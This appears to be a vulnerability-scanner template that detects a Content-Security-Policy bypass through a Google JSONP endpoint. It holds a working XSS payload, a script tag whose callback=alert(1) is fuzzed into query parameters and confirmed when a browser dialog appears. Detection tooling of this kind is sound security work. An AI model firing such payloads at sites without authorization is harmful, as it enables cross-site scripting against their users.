flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - clients6_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: clients6_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - clients6.google.com
  method: GET
  path:
  - '{{BaseURL}}'
id: clients6-csp-bypass
info:
  author: Jaenact
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - clients6
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,clients6,vuln
